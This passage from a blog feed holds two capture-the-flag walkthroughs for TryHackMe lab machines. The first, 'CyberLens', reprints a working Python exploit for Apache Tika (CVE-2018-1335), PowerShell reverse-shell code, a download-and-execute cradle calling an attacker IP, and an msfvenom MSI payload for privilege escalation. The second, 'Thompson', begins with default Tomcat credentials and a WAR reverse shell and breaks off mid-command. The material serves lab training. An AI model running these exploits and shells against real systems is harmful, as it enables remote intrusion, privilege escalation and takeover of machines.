class=&quot;python-code&quot;&gt;######################################################################################################&lt;br&gt;#&lt;span class=&quot;string&quot;&gt;Description:&lt;/span&gt; This is a PoC for remote command execution in Apache Tika-server.&lt;br&gt;#&lt;span class=&quot;string&quot;&gt;Versions Affected:&lt;/span&gt; Tika-server versions &amp;lt; 1.18&lt;br&gt;#&lt;span class=&quot;string&quot;&gt;Researcher:&lt;/span&gt; David Yesland Twitter: @Daveysec&lt;br&gt;#&lt;span class=&quot;string&quot;&gt;Blog Link:&lt;/span&gt; https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika&lt;br&gt;#&lt;span class=&quot;string&quot;&gt;NIST CVE Link:&lt;/span&gt; https://nvd.nist.gov/vuln/detail/CVE-2018-1335&lt;br&gt;######################################################################################################&lt;br&gt;&lt;br&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; sys&lt;br&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; requests&lt;br&gt;&lt;br&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; len(sys.argv) &amp;lt; 4:&lt;br&gt;    &lt;span class=&quot;function&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Usage: python CVE-2018-1335.py &amp;lt;host&amp;gt; &amp;lt;port&amp;gt; &amp;lt;command&amp;gt;&quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;function&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Example: python CVE-2018-1335.py localhost 9998 calc.exe&quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;:&lt;br&gt;    host = sys.argv[1]&lt;br&gt;    port = sys.argv[2]&lt;br&gt;    cmd = sys.argv[3]&lt;br&gt;&lt;br&gt;    url = host + &lt;span class=&quot;function&quot;&gt;str&lt;/span&gt;(port) + &lt;span class=&quot;string&quot;&gt;&quot;/meta&quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    headers = {&lt;span class=&quot;string&quot;&gt;&quot;X-Tika-OCRTesseractPath&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;&quot;cscript&quot;&quot;&lt;/span&gt;,&lt;br&gt;               &lt;span class=&quot;string&quot;&gt;&quot;X-Tika-OCRLanguage&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;//E:Jscript&quot;&lt;/span&gt;,&lt;br&gt;               &lt;span class=&quot;string&quot;&gt;&quot;Expect&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;100-continue&quot;&lt;/span&gt;,&lt;br&gt;               &lt;span class=&quot;string&quot;&gt;&quot;Content-type&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;image/jp2&quot;&lt;/span&gt;,&lt;br&gt;               &lt;span class=&quot;string&quot;&gt;&quot;Connection&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;close&quot;&lt;/span&gt;}&lt;br&gt;&lt;br&gt;    jscript = &lt;span class=&quot;string&quot;&gt;&apos;&apos;&apos;var oShell = WScript.CreateObject(&quot;WScript.Shell&quot;);&lt;br&gt;    var oExec = oShell.Exec(&apos;cmd /c {}&apos;);&apos;&apos;&apos;&lt;/span&gt;.format(cmd)&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;:&lt;br&gt;        requests.put(&lt;span class=&quot;string&quot;&gt;&quot;https://&quot;&lt;/span&gt; + url, headers=headers, data=jscript, verify=False)&lt;br&gt;    &lt;span class=&quot;keyword&quot;&gt;except&lt;/span&gt;:&lt;br&gt;        &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;:&lt;br&gt;            requests.put(&lt;span class=&quot;string&quot;&gt;&quot;http://&quot;&lt;/span&gt; + url, headers=headers, data=jscript)&lt;br&gt;        &lt;span class=&quot;keyword&quot;&gt;except&lt;/span&gt;:&lt;br&gt;            &lt;span class=&quot;function&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Something went wrong. Usage: python CVE-2018-1335.py &amp;lt;host&amp;gt; &amp;lt;port&amp;gt; &amp;lt;command&amp;gt;&quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;The exploit is pretty simple to understand, what it needs is just the remote host remote port and the command to execute. I will test it by executing a simple command such as &lt;code&gt;dir&lt;/code&gt;. Note that the sccript is written in Python2 so make sure to user that version of Python and give execution permission ot the ascript. &lt;code&gt;chmod +x 46540.py&lt;/code&gt;&lt;/p&gt;&lt;p&gt;After executing the command &lt;code&gt;$ python2 46540.py cyberlens.thm 61777 dir&lt;/code&gt; I did not receive any response from the server. This makes me think that the code runs but the output is not reported to me. I can test if the code is successfully executed by trying to download a file from my Kali box. The idea behind this is that if my webserver receives a connection from that target host it means the code was successfully executed. To test this I will use the command &lt;code&gt;curl&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/cyberlens/rce.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Here I can clearly see the successful execution of the code as I received the connection back from the target machine to my webserver. Now I have to craft a payload to get a reverse shell.&lt;/p&gt;&lt;p&gt;The idea here is to give a command to receive a reverse shell, but if I write directly the reverse shell in the following way:&lt;/p&gt;&lt;p&gt;&lt;pre&gt;$ python2 cyberlens.thm 61777 &apos;powershell -c &quot;New-Object System.Net.Sockets.TCPClient(&quot;10.0.2.4&quot;,80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;&apos;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;This gives errors as there is a mix of single and double quotes messing up with the most external single quotes which encloses the powershell command. I also tried to encode the code in Base64 in the following way, and it was also giving me erorrs due to the mixture of single and double quotes.&lt;/p&gt;&lt;p&gt;&lt;pre class=&quot;powershell-code&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$Text&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&apos;Code to encode&apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;variable&quot;&gt;$Bytes&lt;/span&gt; = [&lt;span class=&quot;type&quot;&gt;System.Text.Encoding&lt;/span&gt;]::&lt;span class=&quot;method&quot;&gt;Unicode.GetBytes&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$Text&lt;/span&gt;)&lt;br&gt;&lt;span class=&quot;variable&quot;&gt;$EncodedText&lt;/span&gt; = [&lt;span class=&quot;cmdlet&quot;&gt;Convert&lt;/span&gt;]::&lt;span class=&quot;method&quot;&gt;ToBase64String&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$Bytes&lt;/span&gt;)&lt;br&gt;&lt;span class=&quot;variable&quot;&gt;$EncodedText&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;The second Idea is to download and execute a Powershell script containing the reverse shell. I will use the following reverse shell names &lt;b&gt;rev.ps1&lt;/b&gt;. Change the IP and PORT accordingly.&lt;p&gt;&lt;pre class=&quot;powershell-code&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$client&lt;/span&gt; = &lt;span class=&quot;cmdlet&quot;&gt;New-Object&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;System.Net.Sockets.TCPClient&lt;/span&gt;(&quot;10.10.14.84&quot;, 4444);&lt;br&gt;&lt;span class=&quot;variable&quot;&gt;$stream&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$client&lt;/span&gt;.&lt;span class=&quot;method&quot;&gt;GetStream&lt;/span&gt;();&lt;br&gt;&lt;span class=&quot;type&quot;&gt;[byte[]]&lt;/span&gt;&lt;span class=&quot;variable&quot;&gt;$bytes&lt;/span&gt; = 0..65535 | &lt;span class=&quot;cmdlet&quot;&gt;%&lt;/span&gt;{0};&lt;br&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(&lt;span class=&quot;condition&quot;&gt;($i = $stream.Read($bytes, 0, $bytes.Length))&lt;/span&gt; -ne 0) {&lt;br&gt;    &lt;span class=&quot;variable&quot;&gt;$data&lt;/span&gt; = (&lt;span class=&quot;cmdlet&quot;&gt;New-Object&lt;/span&gt; -&lt;span class=&quot;parameter&quot;&gt;TypeName&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;System.Text.ASCIIEncoding&lt;/span&gt;).&lt;span class=&quot;method&quot;&gt;GetString&lt;/span&gt;($bytes, 0, $i);&lt;br&gt;    &lt;span class=&quot;variable&quot;&gt;$sendback&lt;/span&gt; = (&lt;span class=&quot;cmdlet&quot;&gt;iex&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$data&lt;/span&gt; 2&gt;&amp;1 | &lt;span class=&quot;cmdlet&quot;&gt;Out-String&lt;/span&gt;);&lt;br&gt;    &lt;span class=&quot;variable&quot;&gt;$sendback2&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$sendback&lt;/span&gt; + &quot;# &quot;;&lt;br&gt;    &lt;span class=&quot;variable&quot;&gt;$sendbyte&lt;/span&gt; = ([text.encoding]::ASCII).&lt;span class=&quot;method&quot;&gt;GetBytes&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$sendback2&lt;/span&gt;);&lt;br&gt;    &lt;span class=&quot;variable&quot;&gt;$stream&lt;/span&gt;.&lt;span class=&quot;method&quot;&gt;Write&lt;/span&gt;($sendbyte, 0, $sendbyte.Length);&lt;br&gt;    &lt;span class=&quot;variable&quot;&gt;$stream&lt;/span&gt;.&lt;span class=&quot;method&quot;&gt;Flush&lt;/span&gt;();&lt;br&gt;}&lt;br&gt;&lt;span class=&quot;variable&quot;&gt;$client&lt;/span&gt;.&lt;span class=&quot;method&quot;&gt;Close&lt;/span&gt;();&lt;/pre&gt;&lt;/p&gt;To download and run the script I have to execute the following command: &lt;code&gt;python2 46540.py cyberlens.thm 61777 &apos;powershell -command &quot;IEX(New-Object Net.WebClient).downloadString(&apos;http://10.21.112.161:8000/rev.ps1&apos;)&quot;&lt;/code&gt;. To avoid any error I will encode the Powershell command in Base64.&lt;p&gt;&lt;pre class=&quot;powershell-code&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$payload&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;IEX(New-Object Net.WebClient).downloadString(&apos;http://10.21.112.161:8000/rev.ps1&apos;)&quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;variable&quot;&gt;$Bytes&lt;/span&gt; = [&lt;span class=&quot;type&quot;&gt;System.Text.Encoding&lt;/span&gt;]::&lt;span class=&quot;method&quot;&gt;Unicode.GetBytes&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$payload&lt;/span&gt;)&lt;br&gt;&lt;span class=&quot;variable&quot;&gt;$EncodedText&lt;/span&gt; = [&lt;span class=&quot;cmdlet&quot;&gt;Convert&lt;/span&gt;]::&lt;span class=&quot;method&quot;&gt;ToBase64String&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$Bytes&lt;/span&gt;)&lt;br&gt;&lt;span class=&quot;variable&quot;&gt;$EncodedText&lt;/span&gt;&lt;br&gt;SQBFAFgAKABOA[...REDACTED...]gBlAHYALgBwAHMAMQAnACkA&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/cyberlens/revshell.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Navigatin to the Desktop of the current user I can find the flag.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;$ nc -lvnp 4444&lt;br&gt;listening on [any] 4444 ...&lt;br&gt;connect to [10.21.112.161] from (UNKNOWN) [10.10.133.177] 49860&lt;br&gt;&lt;br&gt;C:\Windows\system32&gt; cd C:/&lt;br&gt;C:\&gt; cd /Users&lt;br&gt;C:\Users&gt; cd CyberLens/Desktop&lt;br&gt;C:\Users\CyberLens\Desktop&gt; dir&lt;br&gt;&lt;br&gt;&lt;br&gt;    Directory: C:\Users\CyberLens\Desktop&lt;br&gt;&lt;br&gt;&lt;br&gt;Mode                LastWriteTime         Length Name                                                                  &lt;br&gt;----                -------------         ------ ----                                                                  &lt;br&gt;-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website                                                  &lt;br&gt;-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website                                   &lt;br&gt;-a----         6/6/2023   7:54 PM             25 user.txt                                                              &lt;br&gt;&lt;br&gt;&lt;br&gt;C:\Users\CyberLens\Desktop&gt; type user.txt&lt;br&gt;THM{T1k4-CV3-f0r-7h3-w1n}&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;The next step is to do privilege escalation.&lt;/p&gt;&lt;p&gt;One trick that I learnt from a friend of mine is the command &lt;b&gt;tree&lt;/b&gt;. I use this command all the time for my personal use. I&apos;m not sure why didn&apos;t I think earlier, it is so helpful and makes the search easy and easy to visualise all the files.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;$ nc -lvnp 4444&lt;br&gt;listening on [any] 4444 ...&lt;br&gt;connect to [10.21.112.161] from (UNKNOWN) [10.10.77.142] 49757&lt;br&gt;&lt;br&gt;C:\Windows\system32&gt; cd C:/Users&lt;br&gt;C:\Users&gt; tree /f&lt;br&gt;Folder PATH listing&lt;br&gt;Volume serial number is A8A4-C362&lt;br&gt;C:.&lt;br&gt;????Administrator&lt;br&gt;????CyberLens&lt;br&gt;?   ????3D Objects&lt;br&gt;?   ????Contacts&lt;br&gt;?   ????Desktop&lt;br&gt;?   ?       EC2 Feedback.website&lt;br&gt;?   ?       EC2 Microsoft Windows Guide.website&lt;br&gt;?   ?       user.txt&lt;br&gt;?   ?       &lt;br&gt;?   ????Documents&lt;br&gt;?   ?   ????Management&lt;br&gt;?   ?           CyberLens-Management.txt&lt;br&gt;?   ?           &lt;br&gt;?   ????Downloads&lt;br&gt;?   ????Favorites&lt;br&gt;?   ?   ?   Bing.url&lt;br&gt;?   ?   ?   &lt;br&gt;?   ?   ????Links&lt;br&gt;?   ????Links&lt;br&gt;?   ?       Desktop.lnk&lt;br&gt;?   ?       Downloads.lnk&lt;br&gt;?   ?       &lt;br&gt;?   ????Music&lt;br&gt;?   ????Pictures&lt;br&gt;?   ????Saved Games&lt;br&gt;?   ????Searches&lt;br&gt;?   ????Videos&lt;br&gt;????Public&lt;br&gt;    ????Documents&lt;br&gt;    ????Downloads&lt;br&gt;    ????Music&lt;br&gt;    ????Pictures&lt;br&gt;    ????Videos&lt;br&gt;C:\Users&gt; type CyberLens\Documents\Management\CyberLens-Management.txt&lt;br&gt;Remember, manual enumeration is often key in an engagement ;)&lt;br&gt;&lt;br&gt;CyberLens&lt;br&gt;HackSmarter123&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;Listing the file structure the only interesting file is &lt;i&gt;CyberLens-Management.txt&lt;/i&gt; which contains credentials. Thinking about the Nmap scan the only other service where I can use credentials is the Remote Desktop Protocol (RDP). The RDP program that I will use is &lt;b&gt;xfreerdp&lt;/b&gt; but &lt;b&gt;remmina&lt;/b&gt; is also a very good alternative that I love to use. &lt;code&gt;xfreerdp /u:CyberLens /p:HackSmarter123 /v:10.10.77.142 +clipboard&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/cyberlens/rdp.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;For the privilege escalation, I used &lt;a href=&quot;https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS&quot;&gt;WinPeas&lt;/a&gt;, I copied the raw text from &lt;a href=&quot;https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASbat/winPEAS.bat&quot;&gt;GitHub&lt;/a&gt; and pasted it into the note saving it with the .bat extension.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/cyberlens/winpeassave.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;I run the script from Powershell, I prefer it as it has a maller font.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/cyberlens/wpexec.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;After spending some time, analysing the output, testing things and failing  I found a misconfiguration.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/cyberlens/missconf.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;You can find more tails about this vulneability on &lt;a href=&quot;https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/AlwaysInstallElevated.md&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;blockquote&gt;&quot;AlwaysInstallElevated&quot; is a Windows Registry setting that affects the behavior of the Windows Installer service. The vulnerability arises when the &quot;AlwaysInstallElevated&quot; registry key is configured with a value of &quot;1&quot; in the Windows Registry.&lt;/p&gt;&lt;p&gt;When this registry key is enabled, it allows non-administrator users to install software packages with elevated privileges. In other words, users who shouldn&apos;t have administrative rights can exploit this vulnerability to execute arbitrary code with elevated permissions, potentially compromising the security of the system.&lt;/blockquote&gt;&lt;/p&gt;&lt;p&gt;What the description is saying is that with that flag enabled the installation process of software is performed with high privileges even when the installation is launched by low-privileged accounts. Now it becomes clear that I have to create a malicious installation file with .msi extension to elevate my privileges.&lt;/p&gt;&lt;p&gt;To create a malicious Windows installation file I can use Msfvenom with the following command:&lt;/p&gt;&lt;p&gt;&lt;pre&gt;$ msfvenom -p windows/shell_reverse_tcp lhost=10.21.112.161 lport=3333 -f msi &gt; reverse.msi&lt;br&gt;[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload&lt;br&gt;[-] No arch selected, selecting arch: x86 from the payload&lt;br&gt;No encoder specified, outputting raw payload&lt;br&gt;Payload size: 324 bytes&lt;br&gt;Final size of msi file: 159744 bytes&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;The next step is to upload &lt;b&gt;reverse.msi&lt;/b&gt; into the target Windows machine via a Python web server and the command &lt;code&gt;curl&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;First, I will open a Python webserver in the same forlder as the &lt;b&gt;reverse.msi&lt;/b&gt;:&lt;/p&gt;&lt;p&gt;&lt;pre&gt;$ python3 -m http.server&lt;br&gt;Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...&lt;br&gt;10.10.232.185 - - [23/Feb/2025 06:36:44] &quot;GET /reverse.msi HTTP/1.1&quot; 200 -&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;I will also open a Netcat listener on my Kali on port 3333, the same port as specified during the creation of the .msi file. &lt;code&gt;nc -lvnp 3333&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Now from the target machine, I will download the file with &lt;code&gt;curl&lt;/code&gt; and execute it.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;C:\Users\CyberLens&gt;curl http://10.21.112.161:8000/reverse.msi --output reverse.msi&lt;br&gt;  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current&lt;br&gt;                                 Dload  Upload   Total   Spent    Left  Speed&lt;br&gt;100  156k  100  156k    0     0   156k      0  0:00:01 --:--:--  0:00:01  369k&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;Upon executing the installation file a warning message will be prompted, just press &quot;ok&quot; to receive the reverse shell on the listening Netcat session on port 3333 previously opened.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/cyberlens/execmsi.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;pre&gt;$ nc -lvnp 3333&lt;br&gt;listening on [any] 3333 ...&lt;br&gt;connect to [10.21.112.161] from (UNKNOWN) [10.10.232.185] 49811&lt;br&gt;Microsoft Windows [Version 10.0.17763.1821]&lt;br&gt;(c) 2018 Microsoft Corporation. All rights reserved.&lt;br&gt;&lt;br&gt;C:\Windows\system32&gt;whoami&lt;br&gt;whoami&lt;br&gt;nt authority\system&lt;br&gt;&lt;br&gt;C:\Users&gt;cd Administrator&lt;br&gt;cd Administrator&lt;br&gt;&lt;br&gt;C:\Users\Administrator&gt;cd Desktop&lt;br&gt;cd Desktop&lt;br&gt;&lt;br&gt;C:\Users\Administrator\Desktop&gt;type admin.txt&lt;br&gt;type admin.txt&lt;br&gt;THM{3lev@t3D-4-pr1v35c!}&lt;/pre&gt;&lt;/p&gt;</content>
        
          <category term="easy"/>
        
          <category term="box"/>
        
          <category term="oscp"/>
        
          <category term="thm"/>
        
          <category term="web"/>
        
          <category term="nsfvenom"/>
        
          <category term="windows"/>
        
          <category term="privesc"/>
        
          <category term="nc"/>
        
          <category term="rce"/>
        
          <category term="reverse shell"/>
        
          <category term="apache tika 1.17"/>
        
          <category term="cve"/>
        
          <category term="curl"/>
        
          <category term="download file"/>
        
          <category term="http 80"/>
        
          <category term="iex"/>
        
          <category term="powershell"/>
        
          <category term="powershell iex"/>
        
          <category term="python web server"/>
        
          <category term="windows"/>
        
          <category term="winpeas"/>
        
          <category term="windows base64 encoding"/>
        
          <category term="msi installer reveshe shell"/>
        
      </item>
    
      <item>
        <title>Thompson</title>
        <link href="https://benwick921.github.io/cyber/writeup/thompson/" rel="alternate" type="text/html" title="Thompson"/>
        <guid>https://benwick921.github.io/cyber/writeup/thompson/</guid>
        <pubDate>Thu, 27 Mar 2025 00:35:02 GMT</pubDate>
        <lastBuildDate>Thu, 27 Mar 2025 00:35:02 GMT</lastBuildDate> 
        <content type="html" xml:base="Thu, 27 Mar 2025 00:35:02 GMT">&lt;img src=&quot;/cyber/writeup/thompson/banner.gif&quot; alt=&quot;&quot;&gt;&lt;p&gt;&lt;pre&gt;# Nmap 7.94SVN scan initiated Thu Feb  6 08:32:29 2025 as: nmap -sC -sV -oN nmap 10.10.23.2&lt;br&gt;Nmap scan report for 10.10.23.2&lt;br&gt;Host is up (0.025s latency).&lt;br&gt;Not shown: 997 closed tcp ports (conn-refused)&lt;br&gt;PORT     STATE SERVICE VERSION&lt;br&gt;22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)&lt;br&gt;| ssh-hostkey: &lt;br&gt;|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)&lt;br&gt;|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)&lt;br&gt;|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)&lt;br&gt;8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)&lt;br&gt;|_ajp-methods: Failed to get a valid response for the OPTION request&lt;br&gt;8080/tcp open  http    Apache Tomcat 8.5.5&lt;br&gt;|_http-favicon: Apache Tomcat&lt;br&gt;|_http-title: Apache Tomcat/8.5.5&lt;br&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;br&gt;&lt;br&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;br&gt;# Nmap done at Thu Feb  6 08:32:37 2025 -- 1 IP address (1 host up) scanned in 8.30 seconds&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;I have 3 pen ports: 22 ssh, 8009 ajp13 (Apache Jserv) and 8080 http (Tomcat).&lt;/p&gt;&lt;p&gt;Accesssing the address &lt;i&gt;http://challenge.ip:8080&lt;/i&gt; I am able to access the tomcat home page.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/thompson/tomcathome.PNG&quot;&gt;&lt;/p&gt;&lt;p&gt;By Clicking &quot;Manage App&quot; I can attemp a log into the admin panel.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/thompson/login.PNG&quot;&gt;&lt;/p&gt;&lt;p&gt;The default credentials are &lt;b&gt;tomcat:s3cret&lt;/b&gt; which I guessed tried some common combination of username and password form this &lt;a href=&quot;https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown&quot;&gt;link&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Once logged in I had the possibility to upload a WAR file.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/thompson/upload.jpg&quot;&gt;&lt;/p&gt;&lt;p&gt;To craft the WAR file I have used MSFVENOM, and I found the comand line on &lt;a href=&quot;https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/&quot;&gt;Google&lt;/a&gt;. The line I used was &quot;non-meterpreter web payload (WAR)&quot;: &lt;code&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST&amp;lt;IP&amp;gt; LPORT=&amp;lt;PORT&amp;gt; -f war &amp;gt; shell.&lt;br&gt;ENTER&lt;br&gt;ENTER&lt;/code&gt;. Once created the file and uploaded I started a NetCat linstener and then visited the uploaded WAR file Link.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/thompson/reverseshell.PNG&quot;&gt;&lt;/p&gt;&lt;p&gt;I have a non interative shell. To upgrade it to an interactive shell I used the fllowing commands:&lt;/p&gt;&lt;p&gt;&lt;pre&gt;/usr/bin/script -qc /bin/bash /dev/null&lt;br&gt;CTRZ+Z&lt;br&gt;stty raw -echo; fg; reset&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/thompson/upgradedshell.PNG&quot;&gt;&lt;/p&gt;&lt;p&gt;Obviously, the first thing that came to my mind was to look for the user flag in the home directory.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;tomcat@ubuntu:/$ cd /home/jack/&lt;br&gt;tomcat@ubuntu:/home/jack$ ls -la&lt;br&gt;total 48&lt;br&gt;drwxr-xr-x 4 jack jack 4096 Aug 23  2019 .&lt;br&gt;drwxr-xr-x 3 root root 4096 Aug 14  2019 ..&lt;br&gt;-rw------- 1 root root 1476 Aug 14  2019 .bash_history&lt;br&gt;-rw-r--r-- 1 jack jack  220 Aug 14  2019 .bash_logout&lt;br&gt;-rw-r--r-- 1 jack jack 3771 Aug 14  2019 .bashrc&lt;br&gt;drwx------ 2 jack jack 4096 Aug 14  2019 .cache&lt;br&gt;-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh&lt;br&gt;drwxrwxr-x 2 jack jack 4096 Aug 14  2019 .nano&lt;br&gt;-rw-r--r-- 1 jack jack  655 Aug 14  2019 .profile&lt;br&gt;-rw-r--r-- 1 jack jack    0 Aug 14  2019 .sudo_as_admin_successful&lt;br&gt;-rw-r--r-- 1 root root   39 Feb  7 05:14 test.txt&lt;br&gt;-rw-rw-r-- 1 jack jack   33 Aug 14  2019 user.txt&lt;br&gt;-rw-r--r-- 1 root root  183 Aug 14  2019 .wget-hsts&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;Here I can see that not only I am able to retrieve the flag but there is a script name &lt;b&gt;id.sh&lt;/b&gt; that has read and write permission. By opening the file it is clear that it is executing the command &lt;b&gt;id&lt;/b&gt; and saving the output in the file named &lt;i&gt;text.txt&lt;/i&gt;.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;tomcat@ubuntu:/home/jack$ cat user.txt&lt;br&gt;39400c90bc683a41a8935e4719f181bf&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;&lt;pre&gt;tomcat@ubuntu:/home/jack$ cat id.sh&lt;br&gt;#!/bin/bash&lt;br&gt;id &gt; test.txt&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;Having read and write permission on &lt;i&gt;id.sh&lt;/i&gt; I was able to enumerate the sudo privilege to check which command the user jack was able to execute as sudo without the password. The command used to enumerate was &lt;code&gt;sudo -l&lt;/code&gt; and the command used to inject the code inside the &lt;i&gt;id.sh&lt;/i&gt; file was &lt;code&gt;echo -e &apos;#!/bin/bash&apos;&quot;\nsudo -l &gt; text.txt&quot; &gt; /home/jack/id.sh&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;pre&gt;tomcat@ubuntu: echo -e &apos;#!/bin/bash&apos;&quot;
sudo -l &gt; text.txt&quot; &gt; /home/jack/id.sh              &lt;br&gt;tomcat@ubuntu:/home/jack$ cat id.sh &lt;br&gt;#!/bin/bash&lt;br&gt;sudo -l &gt; text.txt&lt;br&gt;tomcat@ubuntu:/home/jack$ cat text.txt &lt;br&gt;Matching Defaults entries for root on ubuntu:&lt;br&gt;    env_reset, mail_badpass,&lt;br&gt;    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;br&gt;&lt;br&gt;User root may run the following commands on ubuntu:&lt;br&gt;    (ALL : ALL) ALL&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;This means that I can execute all commands as sudo without the password. It also means that I can execute a reverse shell with &lt;b&gt;sudo&lt;/b&gt; to obtain access as root. The command to inject the payload is: &lt;code&gt;echo -e &apos;#!/bin/bash&apos;&quot;
